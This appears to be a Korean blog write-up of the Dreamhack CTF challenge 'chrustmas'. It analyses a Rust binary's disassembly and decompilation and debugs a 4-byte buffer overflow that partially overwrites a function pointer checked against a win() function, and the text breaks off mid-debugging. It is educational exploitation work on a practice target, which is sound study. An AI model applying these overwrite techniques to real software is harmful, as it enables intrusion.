---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN chrustmas"
excerpt: "드림핵 포너블 chrustmas 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2023-12-29 15:00
---

비오비 수료 후에 학교를 다니면서 보안기사를 취득하느라, 오랜만에 풀어보는 워게임이다. v8 익스플로잇도 공부중인데 해당 내용은 기회가 되면 포스팅 할 예정이다. 이번 문제는 크리스마스 ctf에 출제된 chrustmas 라는 문제이다. 시스템 해킹으로 스코어는 3Level을 가지고 있다.

우선 먼저 실행을 해보자. 바이너리를 실행하면 다음과 같은 화면을 보게된다. 문자열을 입력 받으면 페스워드 검증을 한다고 하고 16자리를 입력 받아 참 거짓 유무를 판단한다.

```c++
root@7cb73a3db36b:/home/dreamhack/chrustmas/deploy# ./prob
Password >> asdf
[97, 115, 100, 102, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
Solo can't hack me!
root@7cb73a3db36b:/home/dreamhack/chrustmas/deploy# ./prob
Password >> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Password maximum size is 16...
root@7cb73a3db36b:/home/dreamhack/chrustmas/deploy# 
root@7cb73a3db36b:/home/dreamhack/chrustmas/deploy# ./prob
Password >> aaaaaaaaaaaaaaaabbbb
[97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97]
Solo can't hack me!
root@7cb73a3db36b:/home/dreamhack/chrustmas/deploy#
```

위 내용을 보면 무언가 이상하다. max size는 16이라고 하는데 마지막 실행 구문을 보면 4바이트를 추가로 입력 가능하다. gdb를 통해서 살펴보자.

```c++
pwndbg> disass main
Dump of assembler code for function main:
   0x000000000000af70 <+0>:     push   rax
   0x000000000000af71 <+1>:     mov    rdx,rsi
   0x000000000000af74 <+4>:     movsxd rsi,edi
   0x000000000000af77 <+7>:     lea    rdi,[rip+0xfffffffffffffc12]        # 0xab90 <_ZN4prob4main17h5c6c2c95bc71f04bE>
   0x000000000000af7e <+14>:    xor    ecx,ecx
   0x000000000000af80 <+16>:    call   0x93c0 <_ZN3std2rt10lang_start17hf7281ca14fc25c65E>
   0x000000000000af85 <+21>:    pop    rcx
   0x000000000000af86 <+22>:    ret    
End of assembler dump.
pwndbg> disass _ZN4prob4main17h5c6c2c95bc71f04bE
Dump of assembler code for function _ZN4prob4main17h5c6c2c95bc71f04bE:
   0x000000000000ab90 <+0>:     sub    rsp,0x208
   0x000000000000ab97 <+7>:     lea    rsi,[rip+0x54532]        # 0x5f0d0
   0x000000000000ab9e <+14>:    lea    rdi,[rsp+0x98]
   0x000000000000aba6 <+22>:    mov    QWORD PTR [rsp+0x80],rdi
   0x000000000000abae <+30>:    mov    edx,0x1
   0x000000000000abb3 <+35>:    call   0x97d0 <_ZN4core3fmt9Arguments9new_const17h795ce44452297527E>
   0x000000000000abb8 <+40>:    mov    rdi,QWORD PTR [rsp+0x80]
   0x000000000000abc0 <+48>:    lea    rax,[rip+0x1a1b9]        # 0x24d80 <_ZN3std2io5stdio6_print17h63a00216c7cec9b0E>
   0x000000000000abc7 <+55>:    call   rax
   0x000000000000abc9 <+57>:    lea    rdi,[rsp+0xc8]
   0x000000000000abd1 <+65>:    call   0xa150 <_ZN5alloc6string6String3new17h7e53fa0b3a6780a1E>
   0x000000000000abd6 <+70>:    lea    rax,[rip+0x19623]        # 0x24200 <_ZN3std2io5stdio6stdout17h4f8abd8acea54c79E>
   0x000000000000abdd <+77>:    call   rax
   0x000000000000abdf <+79>:    mov    QWORD PTR [rsp+0x88],rax
   0x000000000000abe7 <+87>:    jmp    0xac11 <_ZN4prob4main17h5c6c2c95bc71f04bE+129>
   0x000000000000abe9 <+89>:    lea    rdi,[rsp+0xc8]
   0x000000000000abf1 <+97>:    call   0x9970 <_ZN4core3ptr42drop_in_place$LT$alloc..string..String$GT$17hdb4d12f0836ed276E>
   0x000000000000abf6 <+102>:   jmp    0xaf57 <_ZN4prob4main17h5c6c2c95bc71f04bE+967>
   0x000000000000abfb <+107>:   mov    rcx,rax
   0x000000000000abfe <+110>:   mov    eax,edx
   0x000000000000ac00 <+112>:   mov    QWORD PTR [rsp+0x1e8],rcx
   0x000000000000ac08 <+120>:   mov    DWORD PTR [rsp+0x1f0],eax
   0x000000000000ac0f <+127>:   jmp    0xabe9 <_ZN4prob4main17h5c6c2c95bc71f04bE+89>
   0x000000000000ac11 <+129>:   mov    rax,QWORD PTR [rsp+0x88]
   0x000000000000ac19 <+137>:   mov    QWORD PTR [rsp+0xe8],rax
   0x000000000000ac21 <+145>:   lea    rax,[rip+0x19608]        # 0x24230 <_ZN57_$LT$std..io..stdio..Stdout$u20$as$u20$std..io..Write$GT$5flush17h788b0765478199e0E>
   0x000000000000ac28 <+152>:   lea    rdi,[rsp+0xe8]
   0x000000000000ac30 <+160>:   call   rax
   0x000000000000ac32 <+162>:   mov    QWORD PTR [rsp+0x78],rax
   0x000000000000ac37 <+167>:   jmp    0xac39 <_ZN4prob4main17h5c6c2c95bc71f04bE+169>
   0x000000000000ac39 <+169>:   mov    rdi,QWORD PTR [rsp+0x78]
   0x000000000000ac3e <+174>:   call   0xa5d0 <_ZN79_$LT$core..result..Result$LT$T$C$E$GT$$u20$as$u20$core..ops..try_trait..Try$GT$6branch17hf2b8d074e60fa146E>
   0x000000000000ac43 <+179>:   mov    QWORD PTR [rsp+0x70],rax
   0x000000000000ac48 <+184>:   jmp    0xac4a <_ZN4prob4main17h5c6c2c95bc71f04bE+186>
   0x000000000000ac4a <+186>:   mov    rax,QWORD PTR [rsp+0x70]
   0x000000000000ac4f <+191>:   mov    QWORD PTR [rsp+0xe0],rax
   0x000000000000ac57 <+199>:   mov    rdx,QWORD PTR [rsp+0xe0]
   0x000000000000ac5f <+207>:   mov    eax,0x1
   0x000000000000ac64 <+212>:   xor    ecx,ecx
   0x000000000000ac66 <+214>:   cmp    rdx,0x0
   0x000000000000ac6a <+218>:   cmove  rax,rcx
   0x000000000000ac6e <+222>:   cmp    rax,0x0
   0x000000000000ac72 <+226>:   jne    0xac84 <_ZN4prob4main17h5c6c2c95bc71f04bE+244>
   0x000000000000ac74 <+228>:   lea    rax,[rip+0x19385]        # 0x24000 <_ZN3std2io5stdio5stdin17h586bfeb28b16622bE>
   0x000000000000ac7b <+235>:   call   rax
   0x000000000000ac7d <+237>:   mov    QWORD PTR [rsp+0x68],rax
   0x000000000000ac82 <+242>:   jmp    0xaca2 <_ZN4prob4main17h5c6c2c95bc71f04bE+274>
   0x000000000000ac84 <+244>:   mov    rdi,QWORD PTR [rsp+0xe0]
   0x000000000000ac8c <+252>:   lea    rsi,[rip+0x544a5]        # 0x5f138
   0x000000000000ac93 <+259>:   call   0x8e80 <_ZN153_$LT$core..result..Result$LT$T$C$F$GT$$u20$as$u20$core..ops..try_trait..FromResidual$LT$core..result..Result$LT$core..convert..Infallible$C$E$GT$$GT$$GT$13from_residual17hd4c9315abd7ba83dE>
   0x000000000000ac98 <+264>:   mov    QWORD PTR [rsp+0x60],rax
   0x000000000000ac9d <+269>:   jmp    0xaf3d <_ZN4prob4main17h5c6c2c95bc71f04bE+941>
   0x000000000000aca2 <+274>:   mov    rax,QWORD PTR [rsp+0x68]
   0x000000000000aca7 <+279>:   mov    QWORD PTR [rsp+0x110],rax
   0x000000000000acaf <+287>:   lea    rax,[rip+0x1937a]        # 0x24030 <_ZN3std2io5stdio5Stdin9read_line17hba9f1b4004981d34E>
   0x000000000000acb6 <+294>:   lea    rdi,[rsp+0x100]
   0x000000000000acbe <+302>:   lea    rsi,[rsp+0x110]
   0x000000000000acc6 <+310>:   lea    rdx,[rsp+0xc8]
   0x000000000000acce <+318>:   call   rax
   0x000000000000acd0 <+320>:   jmp    0xacd2 <_ZN4prob4main17h5c6c2c95bc71f04bE+322>
   0x000000000000acd2 <+322>:   lea    rdi,[rsp+0xf0]
   0x000000000000acda <+330>:   lea    rsi,[rsp+0x100]
   0x000000000000ace2 <+338>:   call   0xa4e0 <_ZN79_$LT$core..result..Result$LT$T$C$E$GT$$u20$as$u20$core..ops..try_trait..Try$GT$6branch17ha604e71f9b0fb167E>
   0x000000000000ace7 <+343>:   jmp    0xace9 <_ZN4prob4main17h5c6c2c95bc71f04bE+345>
   0x000000000000ace9 <+345>:   cmp    QWORD PTR [rsp+0xf0],0x0
   0x000000000000acf2 <+354>:   jne    0xad0d <_ZN4prob4main17h5c6c2c95bc71f04bE+381>
   0x000000000000acf4 <+356>:   lea    rdi,[rsp+0xc8]
   0x000000000000acfc <+364>:   call   0xa2e0 <_ZN65_$LT$alloc..string..String$u20$as$u20$core..ops..deref..Deref$GT$5deref17h2a8d3d76c5823b24E>
   0x000000000000ad01 <+369>:   mov    QWORD PTR [rsp+0x50],rdx
   0x000000000000ad06 <+374>:   mov    QWORD PTR [rsp+0x58],rax
   0x000000000000ad0b <+379>:   jmp    0xad2b <_ZN4prob4main17h5c6c2c95bc71f04bE+411>
   0x000000000000ad0d <+381>:   mov    rdi,QWORD PTR [rsp+0xf8]
   0x000000000000ad15 <+389>:   lea    rsi,[rip+0x54404]        # 0x5f120
   0x000000000000ad1c <+396>:   call   0x8e80 <_ZN153_$LT$core..result..Result$LT$T$C$F$GT$$u20$as$u20$core..ops..try_trait..FromResidual$LT$core..result..Result$LT$core..convert..Infallible$C$E$GT$$GT$$GT$13from_residual17hd4c9315abd7ba83dE>
   0x000000000000ad21 <+401>:   mov    QWORD PTR [rsp+0x48],rax
   0x000000000000ad26 <+406>:   jmp    0xaf2e <_ZN4prob4main17h5c6c2c95bc71f04bE+926>
   0x000000000000ad2b <+411>:   mov    rsi,QWORD PTR [rsp+0x50]
   0x000000000000ad30 <+416>:   mov    rdi,QWORD PTR [rsp+0x58]
   0x000000000000ad35 <+421>:   call   0x9f30 <_ZN4core3str21_$LT$impl$u20$str$GT$4trim17h93c161271e464c8bE>
   0x000000000000ad3a <+426>:   mov    QWORD PTR [rsp+0x38],rdx
   0x000000000000ad3f <+431>:   mov    QWORD PTR [rsp+0x40],rax
   0x000000000000ad44 <+436>:   jmp    0xad46 <_ZN4prob4main17h5c6c2c95bc71f04bE+438>
   0x000000000000ad46 <+438>:   mov    rsi,QWORD PTR [rsp+0x38]
   0x000000000000ad4b <+443>:   mov    rdi,QWORD PTR [rsp+0x40]
   0x000000000000ad50 <+448>:   mov    rax,rdi
   0x000000000000ad53 <+451>:   mov    QWORD PTR [rsp+0x20],rax
   0x000000000000ad58 <+456>:   mov    rax,rsi
   0x000000000000ad5b <+459>:   mov    QWORD PTR [rsp+0x28],rax
   0x000000000000ad60 <+464>:   xorps  xmm0,xmm0
   0x000000000000ad63 <+467>:   movaps XMMWORD PTR [rsp+0x130],xmm0
   0x000000000000ad6b <+475>:   movups xmm0,XMMWORD PTR [rsp+0x130]
   0x000000000000ad73 <+483>:   movups XMMWORD PTR [rsp+0x118],xmm0
   0x000000000000ad7b <+491>:   lea    rax,[rip+0xfffffffffffffc7e]        # 0xaa00 <_ZN4prob4rust17hdda0a7f774721c38E>
   0x000000000000ad82 <+498>:   mov    QWORD PTR [rsp+0x128],rax
   0x000000000000ad8a <+506>:   call   0x9f20 <_ZN4core3str21_$LT$impl$u20$str$GT$3len17h9e7fb9204b425ad0E>
   0x000000000000ad8f <+511>:   mov    QWORD PTR [rsp+0x30],rax
   0x000000000000ad94 <+516>:   jmp    0xad96 <_ZN4prob4main17h5c6c2c95bc71f04bE+518>
   0x000000000000ad96 <+518>:   mov    rax,QWORD PTR [rsp+0x30]
   0x000000000000ad9b <+523>:   cmp    rax,0x16
   0x000000000000ad9f <+527>:   ja     0xada3 <_ZN4prob4main17h5c6c2c95bc71f04bE+531>
   0x000000000000ada1 <+529>:   jmp    0xadc1 <_ZN4prob4main17h5c6c2c95bc71f04bE+561>
   0x000000000000ada3 <+531>:   lea    rsi,[rip+0x54366]        # 0x5f110
   0x000000000000adaa <+538>:   lea    rdi,[rsp+0x148]
   0x000000000000adb2 <+546>:   mov    edx,0x1
   0x000000000000adb7 <+551>:   call   0x97d0 <_ZN4core3fmt9Arguments9new_const17h795ce44452297527E>
   0x000000000000adbc <+556>:   jmp    0xaf00 <_ZN4prob4main17h5c6c2c95bc71f04bE+880>
   0x000000000000adc1 <+561>:   jmp    0xadc3 <_ZN4prob4main17h5c6c2c95bc71f04bE+563>
   0x000000000000adc3 <+563>:   mov    rsi,QWORD PTR [rsp+0x28]
   0x000000000000adc8 <+568>:   mov    rdi,QWORD PTR [rsp+0x20]
   0x000000000000adcd <+573>:   call   0x9f20 <_ZN4core3str21_$LT$impl$u20$str$GT$3len17h9e7fb9204b425ad0E>
   0x000000000000add2 <+578>:   mov    QWORD PTR [rsp+0x18],rax
   0x000000000000add7 <+583>:   jmp    0xadd9 <_ZN4prob4main17h5c6c2c95bc71f04bE+585>
   0x000000000000add9 <+585>:   mov    rdx,QWORD PTR [rsp+0x18]
   0x000000000000adde <+590>:   mov    rsi,QWORD PTR [rsp+0x20]
   0x000000000000ade3 <+595>:   lea    rdi,[rsp+0x118]
   0x000000000000adeb <+603>:   mov    rax,QWORD PTR [rip+0x5702e]        # 0x61e20
   0x000000000000adf2 <+610>:   call   rax
   0x000000000000adf4 <+612>:   lea    rax,[rsp+0x118]
   0x000000000000adfc <+620>:   mov    QWORD PTR [rsp+0x1f8],rax
   0x000000000000ae04 <+628>:   lea    rax,[rip+0xfffffffffffff195]        # 0x9fa0 <_ZN4core5array69_$LT$impl$u20$core..fmt..Debug$u20$for$u20$$u5b$T$u3b$$u20$N$u5d$$GT$3fmt17h991f9fda7cad7759E>
   0x000000000000ae0b <+635>:   mov    QWORD PTR [rsp+0x200],rax
   0x000000000000ae13 <+643>:   mov    rax,QWORD PTR [rsp+0x1f8]
   0x000000000000ae1b <+651>:   mov    QWORD PTR [rsp+0x8],rax
   0x000000000000ae20 <+656>:   mov    rax,QWORD PTR [rsp+0x200]
   0x000000000000ae28 <+664>:   mov    QWORD PTR [rsp+0x10],rax
   0x000000000000ae2d <+669>:   mov    rax,QWORD PTR [rsp+0x10]
   0x000000000000ae32 <+674>:   mov    rcx,QWORD PTR [rsp+0x8]
   0x000000000000ae37 <+679>:   mov    QWORD PTR [rsp+0x1a8],rcx
   0x000000000000ae3f <+687>:   mov    QWORD PTR [rsp+0x1b0],rax
   0x000000000000ae47 <+695>:   lea    rsi,[rip+0x54292]        # 0x5f0e0
   0x000000000000ae4e <+702>:   lea    rdi,[rsp+0x178]
   0x000000000000ae56 <+710>:   mov    edx,0x2
   0x000000000000ae5b <+715>:   lea    rcx,[rsp+0x1a8]
   0x000000000000ae63 <+723>:   mov    r8d,0x1
   0x000000000000ae69 <+729>:   call   0x96d0 <_ZN4core3fmt9Arguments6new_v117h9deafe6774c9e956E>
   0x000000000000ae6e <+734>:   jmp    0xae70 <_ZN4prob4main17h5c6c2c95bc71f04bE+736>
   0x000000000000ae70 <+736>:   lea    rax,[rip+0x19f09]        # 0x24d80 <_ZN3std2io5stdio6_print17h63a00216c7cec9b0E>
   0x000000000000ae77 <+743>:   lea    rdi,[rsp+0x178]
   0x000000000000ae7f <+751>:   call   rax
   0x000000000000ae81 <+753>:   jmp    0xae83 <_ZN4prob4main17h5c6c2c95bc71f04bE+755>
   0x000000000000ae83 <+755>:   mov    rax,QWORD PTR [rsp+0x128]
   0x000000000000ae8b <+763>:   lea    rcx,[rip+0xfffffffffffffb7e]        # 0xaa10 <_ZN4prob3win17h2a8d1a9bcf67a7d9E>
   0x000000000000ae92 <+770>:   cmp    rax,rcx
   0x000000000000ae95 <+773>:   jne    0xaea3 <_ZN4prob4main17h5c6c2c95bc71f04bE+787>
   0x000000000000ae97 <+775>:   mov    rax,QWORD PTR [rsp+0x128]
   0x000000000000ae9f <+783>:   call   rax
   0x000000000000aea1 <+785>:   jmp    0xaebe <_ZN4prob4main17h5c6c2c95bc71f04bE+814>
   0x000000000000aea3 <+787>:   lea    rsi,[rip+0x54256]        # 0x5f100
   0x000000000000aeaa <+794>:   lea    rdi,[rsp+0x1b8]
   0x000000000000aeb2 <+802>:   mov    edx,0x1
   0x000000000000aeb7 <+807>:   call   0x97d0 <_ZN4core3fmt9Arguments9new_const17h795ce44452297527E>
   0x000000000000aebc <+812>:   jmp    0xaedb <_ZN4prob4main17h5c6c2c95bc71f04bE+843>
   0x000000000000aebe <+814>:   jmp    0xaec0 <_ZN4prob4main17h5c6c2c95bc71f04bE+816>
   0x000000000000aec0 <+816>:   mov    QWORD PTR [rsp+0x90],0x0
   0x000000000000aecc <+828>:   lea    rdi,[rsp+0xc8]
   0x000000000000aed4 <+836>:   call   0x9970 <_ZN4core3ptr42drop_in_place$LT$alloc..string..String$GT$17hdb4d12f0836ed276E>
   0x000000000000aed9 <+841>:   jmp    0xaef0 <_ZN4prob4main17h5c6c2c95bc71f04bE+864>
   0x000000000000aedb <+843>:   lea    rax,[rip+0x19e9e]        # 0x24d80 <_ZN3std2io5stdio6_print17h63a00216c7cec9b0E>
   0x000000000000aee2 <+850>:   lea    rdi,[rsp+0x1b8]
   0x000000000000aeea <+858>:   call   rax
   0x000000000000aeec <+860>:   jmp    0xaeee <_ZN4prob4main17h5c6c2c95bc71f04bE+862>
   0x000000000000aeee <+862>:   jmp    0xaec0 <_ZN4prob4main17h5c6c2c95bc71f04bE+816>
   0x000000000000aef0 <+864>:   mov    rax,QWORD PTR [rsp+0x90]
   0x000000000000aef8 <+872>:   add    rsp,0x208
   0x000000000000aeff <+879>:   ret    
   0x000000000000af00 <+880>:   lea    rax,[rip+0x19e79]        # 0x24d80 <_ZN3std2io5stdio6_print17h63a00216c7cec9b0E>
   0x000000000000af07 <+887>:   lea    rdi,[rsp+0x148]
   0x000000000000af0f <+895>:   call   rax
   0x000000000000af11 <+897>:   jmp    0xaf13 <_ZN4prob4main17h5c6c2c95bc71f04bE+899>
   0x000000000000af13 <+899>:   mov    QWORD PTR [rsp+0x90],0x0
   0x000000000000af1f <+911>:   lea    rdi,[rsp+0xc8]
   0x000000000000af27 <+919>:   call   0x9970 <_ZN4core3ptr42drop_in_place$LT$alloc..string..String$GT$17hdb4d12f0836ed276E>
   0x000000000000af2c <+924>:   jmp    0xaef0 <_ZN4prob4main17h5c6c2c95bc71f04bE+864>
   0x000000000000af2e <+926>:   mov    rax,QWORD PTR [rsp+0x48]
   0x000000000000af33 <+931>:   mov    QWORD PTR [rsp+0x90],rax
   0x000000000000af3b <+939>:   jmp    0xaf1f <_ZN4prob4main17h5c6c2c95bc71f04bE+911>
   0x000000000000af3d <+941>:   mov    rax,QWORD PTR [rsp+0x60]
   0x000000000000af42 <+946>:   mov    QWORD PTR [rsp+0x90],rax
   0x000000000000af4a <+954>:   jmp    0xaf1f <_ZN4prob4main17h5c6c2c95bc71f04bE+911>
   0x000000000000af4c <+956>:   lea    rax,[rip+0xffffffffffffd65d]        # 0x85b0 <_ZN4core9panicking16panic_in_cleanup17hceade526831b1e89E>
   0x000000000000af53 <+963>:   call   rax
   0x000000000000af55 <+965>:   ud2    
   0x000000000000af57 <+967>:   mov    rdi,QWORD PTR [rsp+0x1e8]
   0x000000000000af5f <+975>:   call   0x6040 <_Unwind_Resume@plt>
   0x000000000000af64 <+980>:   ud2    
```

보면 좀 난해하다. 처음에는 C++인줄 알았는데 러스트 기반 바이너리다. 위 부분을 ghidra 디컴파일을 통해 살펴보면 다음과 같다.

```c++
/* prob::main */

undefined8 prob::main(void)

{
  long lVar1;
  void *__src;
  ulong uVar2;
  size_t __n;
  undefined auVar3 [16];
  undefined8 local_178;
  undefined8 local_170 [6];
  void *local_140 [3];
  long local_128;
  undefined8 *local_120;
  long local_118;
  undefined8 local_110;
  long local_108 [2];
  int *local_f8;
  undefined4 local_f0;
  undefined4 uStack_ec;
  undefined4 uStack_e8;
  undefined4 uStack_e4;
  code *local_e0;
  undefined local_d8 [16];
  undefined8 local_c0 [6];
  undefined8 local_90 [6];
  undefined4 *local_60;
  code *local_58;
  undefined8 local_50 [8];
  undefined4 *local_10;
  code *local_8;
  
  core::fmt::Arguments::new_const(local_170,&DAT_0015f0d0,1);
  std::io::stdio::_print((size_t)local_170);
  alloc::string::String::new(local_140);
                    /* try { // try from 0010abd6 to 0010abde has its CatchHandler @ 0010abfb */
  local_120 = std::io::stdio::stdout();
                    /* try { // try from 0010ac21 to 0010add1 has its CatchHandler @ 0010abfb */
  lVar1 = <>::flush(&local_120);
  local_128 = <>::branch(lVar1);
  if (local_128 == 0) {
    local_f8 = (int *)std::io::stdio::stdin();
    std::io::stdio::Stdin::read_line(local_108,&local_f8,local_140);
    <>::branch(&local_118,local_108);
    if (local_118 == 0) {
      auVar3 = <>::deref(local_140);
      auVar3 = core::str::<impl_str>::trim(auVar3._0_8_,auVar3._8_8_);
      __src = auVar3._0_8_;
      local_d8 = ZEXT816(0);
      local_f0 = 0;
      uStack_ec = 0;
      uStack_e8 = 0;
      uStack_e4 = 0;
      local_e0 = rust;
      uVar2 = core::str::<impl_str>::len(__src,auVar3._8_8_);
      if (uVar2 < 0x17) {
        __n = core::str::<impl_str>::len(__src,auVar3._8_8_);
        memmove(&local_f0,__src,__n);
        local_60 = &local_f0;
        local_8 = [T;_N]>::fmt;
        local_58 = [T;_N]>::fmt;
                    /* try { // try from 0010ae47 to 0010aebb has its CatchHandler @ 0010abfb */
        local_10 = local_60;
        core::fmt::Arguments::new_v1
                  (local_90,&PTR_s_/rustc/a28077b28a02b92985b3a3fae_0015f0e0,2,&local_60,1);
        std::io::stdio::_print((size_t)local_90);
        if (local_e0 == win) {
          win();
        }
        else {
          core::fmt::Arguments::new_const(local_50,&DAT_0015f100,1);
                    /* try { // try from 0010aedb to 0010af10 has its CatchHandler @ 0010abfb */
          std::io::stdio::_print((size_t)local_50);
        }
        core::ptr::drop_in_place<>(local_140);
        return 0;
      }
      core::fmt::Arguments::new_const(local_c0,&DAT_0015f110,1);
      std::io::stdio::_print((size_t)local_c0);
      local_178 = 0;
    }
    else {
      local_178 = <>::from_residual(local_110);
    }
  }
  else {
    local_178 = <>::from_residual(local_128);
  }
  core::ptr::drop_in_place<>(local_140);
  return local_178;
}
```

```c++
 if (local_e0 == win) {
          win();
  }
```
위 부분에서 win()함수를 실행하면 될것 같다. 러스트 디버깅이나 동작 방식이 처음 접하는 내용이라 동적 정적 분석을 수시로 왔다갔다 하면서 진행했다. 동적 분석에서 bp를 걸고 확인해보면 win()함수가 동작하지 않았다. 따라서 4바이트 오버플로우가 가능한 부분에 더비 값을 채우고 레지스터를 확인해보자.

```c++
   0x000000000000ae83 <+755>:   mov    rax,QWORD PTR [rsp+0x128]
   0x000000000000ae8b <+763>:   lea    rcx,[rip+0xfffffffffffffb7e]        # 0xaa10 <_ZN4prob3win17h2a8d1a9bcf67a7d9E>
   0x000000000000ae92 <+770>:   cmp    rax,rcx
   0x000000000000ae95 <+773>:   jne    0xaea3 <_ZN4prob4main17h5c6c2c95bc71f04bE+787>
   0x000000000000ae97 <+775>:   mov    rax,QWORD PTR [rsp+0x128]
   0x000000000000ae9f <+783>:   call   rax
```
위 부분에 bp를 걸고 보면 알 수 있다. 다음 사진은 16크기의 a와 b 4개를 붙여 동적 디버깅 해보았다.

```c++
0x000055555555ee92 in prob::main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────
 RAX  0x555562626262
 RBX  0x1
*RCX  0x55555555ea10 (prob::win) ◂— sub rsp, 0xe8
 RDX  0xfffffffffffffffc
 RDI  0x5555555b7500 ◂— 0x2c3739202c37395b ('[97, 97,')
 RSI  0x5555555b6078 (std::io::stdio::STDOUT) ◂— 0x0
 R8   0xa
 R9   0x2
 R10  0x5555555a6364 ◂— 0x101010101010101
 R11  0x246
 R12  0x7fffff7ff000 ◂— 0x0
 R13  0x0
 R14  0x7fffffffe4f0 —▸ 0x55555555eb90 (prob::main) ◂— sub rsp, 0x208
 R15  0x7fffffffe470 ◂— 0x0
 RBP  0x7fffff7fe000
 RSP  0x7fffffffe170 ◂— 0x0
*RIP  0x55555555ee92 (prob::main+770) ◂— cmp rax, rcx
───────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────
   0x55555555ee83 <prob::main+755>    mov    rax, qword ptr [rsp + 0x128]
   0x55555555ee8b <prob::main+763>    lea    rcx, [rip - 0x482]            <prob::win>
 ► 0x55555555ee92 <prob::main+770>    cmp    rax, rcx                      <prob::win>
   0x55555555ee95 <prob::main+773>    jne    prob::main+787                <prob::main+787>
    ↓
   0x55555555eea3 <prob::main+787>    lea    rsi, [rip + 0x54256]
   0x55555555eeaa <prob::main+794>    lea    rdi, [rsp + 0x1b8]
   0x55555555eeb2 <prob::main+802>    mov    edx, 1
   0x55555555eeb7 <prob::main+807>    call   core::fmt::Arguments::new_const                <core::fmt::Arguments::new_const>
 
   0x55555555eebc <prob::main+812>    jmp    prob::main+843                <prob::main+843>
 
   0x55555555eebe <prob::main+814>    jmp    prob::main+816                <0x55555555eec0>
 
   0x55555555eec0 <prob::main+816>    mov    qword ptr [rsp + 0x90], 0
─────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe170 ◂— 0x0
01:0008│     0x7fffffffe178 —▸ 0x7fffffffe288 ◂— 'aaaaaaaaaaaaaaaabbbbUU'
02:0010│     0x7fffffffe180 —▸ 0x55555555dfa0 (core::array::<impl core::fmt::Debug for [T; N]>::fmt) ◂— sub rsp, 0x18
03:0018│     0x7fffffffe188 ◂— 0x14
04:0020│     0x7fffffffe190 —▸ 0x5555555b9bb0 ◂— 'aaaaaaaaaaaaaaaabbbb\n'
05:0028│     0x7fffffffe198 ◂— 0x14
... ↓        2 skipped
───────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────
 ► 0   0x55555555ee92 prob::main+770
   1   0x55555555d883 core::ops::function::FnOnce::call_once+3
   2   0x55555555cea6 std::sys_common::backtrace::__rust_begin_short_backtrace+6
   3   0x55555555d409 std::rt::lang_start::{{closure}}+9
   4   0x5555555763ab std::rt::lang_start_internal+1051
   5   0x5555555763ab std::rt::lang_start_internal+1051
   6   0x5555555763ab std::rt::lang_start_internal+1051
   7   0x5555555763ab std::rt::lang_start_internal+1051
───────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

cmp 부분을 보면 rcx와 rax를 비교하는데 rax 부분이 b의 아스키 코드인 62로 일부 덮어쓰여져 있다. rcx는 0x55555555ea10 값을 가지고 있으며 win()함수의 주소를 가지고 있다. 이 값이 rax에 동일하게 있으면 wi()함수를 실행하게 될 것이다.

그럼 공격 방법을 찾아보자

4바이트 오버라이트가 가능하니 상식적으로 생각해보면 16개의 a 뒤에 0x5555ea10 값을 넣어 전송하면 문제가 풀릴 것이다.

이떄 예상하지 못한 에러로그를 보았다. Error: Error { kind: InvalidData, message: "stream did not contain valid UTF-8" } 라는 문구가 출력 되었다. 찾아보니 stdin을 통해 입력 받는 값 중 UTF-8인코딩이 불가능한 값이 있는 것 같은 느낌이 들었다.

0x5555ea10중 해당 에러를 띄워주는 부분을 0xea 부분으로 추측했다. 아스키코드에는 없는 값이고 해당 값을 파이썬으로 utf-8인코딩을 걸었을 때 에러가 발생하였다. 그러면 0x5555ea까지는 사용할 수 없다는 것을 의미한다. 즉, 1바이트로 주소값을 조작해야 하는데 가능한지 살펴보자.


```c+
0x000055555555ee92 in prob::main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────
 RAX  0x55555555ea62 (prob::win+82) ◂— add byte ptr [rdi], cl
 RBX  0x1
*RCX  0x55555555ea10 (prob::win) ◂— sub rsp, 0xe8
 RDX  0xfffffffffffffffc
 RDI  0x5555555b7500 ◂— 0x2c3739202c37395b ('[97, 97,')
 RSI  0x5555555b6078 (std::io::stdio::STDOUT) ◂— 0x0
 R8   0xa
 R9   0x2
 R10  0x5555555a6364 ◂— 0x101010101010101
 R11  0x246
 R12  0x7fffff7ff000 ◂— 0x0
 R13  0x0
 R14  0x7fffffffe4f0 —▸ 0x55555555eb90 (prob::main) ◂— sub rsp, 0x208
 R15  0x7fffffffe470 ◂— 0x0
 RBP  0x7fffff7fe000
 RSP  0x7fffffffe170 ◂— 0x0
*RIP  0x55555555ee92 (prob::main+770) ◂— cmp rax, rcx
───────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────
   0x55555555ee83 <prob::main+755>    mov    rax, qword ptr [rsp + 0x128]
   0x55555555ee8b <prob::main+763>    lea    rcx, [rip - 0x482]            <prob::win>
 ► 0x55555555ee92 <prob::main+770>    cmp    rax, rcx
   0x55555555ee95 <prob::main+773>    jne    prob::main+787                <prob::main+787>
    ↓
   0x55555555eea3 <prob::main+787>    lea    rsi, [rip + 0x54256]
   0x55555555eeaa <prob::main+794>    lea    rdi, [rsp + 0x1b8]
   0x55555555eeb2 <prob::main+802>    mov    edx, 1
   0x55555555eeb7 <prob::main+807>    call   core::fmt::Arguments::new_const                <core::fmt::Arguments::new_const>
 
   0x55555555eebc <prob::main+812>    jmp    prob::main+843                <prob::main+843>
 
   0x55555555eebe <prob::main+814>    jmp    prob::main+816                <0x55555555eec0>
 
   0x55555555eec0 <prob::main+816>    mov    qword ptr [rsp + 0x90], 0
─────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe170 ◂— 0x0
01:0008│     0x7fffffffe178 —▸ 0x7fffffffe288 ◂— 0x6161616161616161 ('aaaaaaaa')
